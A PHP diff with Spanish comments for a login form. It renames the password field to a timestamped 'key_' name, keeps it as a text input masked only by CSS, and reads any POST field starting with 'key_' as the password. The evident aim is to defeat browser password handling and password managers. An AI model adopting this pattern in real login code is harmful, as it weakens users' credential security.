@@ -16,8 +16,14 @@ $error = '';
 if ($_SERVER['REQUEST_METHOD'] === 'POST') {
 
     $email    = trim($_POST['email'] ?? '');
-    // Usamos el nuevo nombre de campo aleatorio
-    $password = trim($_POST['acceso_key'] ?? '');
+    // Buscamos cualquier campo que empiece por 'key_' para obtener la contraseña
+    $password = '';
+    foreach ($_POST as $key => $value) {
+        if (strpos($key, 'key_') === 0) {
+            $password = trim($value);
+            break;
+        }
+    }
 
     if (empty($email) || empty($password)) {
         $error = 'Por favor completa todos los campos.';
@@ -95,13 +101,13 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
                 </div>
 
                 <div class="form-group">
-                    <label for="password_final">Contraseña</label>
+                    <label for="p_field">Contraseña</label>
                     <input
                         type="text"
-                        id="password_final"
-                        name="acceso_key"
+                        id="p_field"
+                        name="key_<?= time() ?>" 
                         placeholder="••••••••"
-                        style="-webkit-text-security: disc;" 
+                        style="-webkit-text-security: disc; -moz-appearance: none;" 
                         autocomplete="off"
                         required
                     >
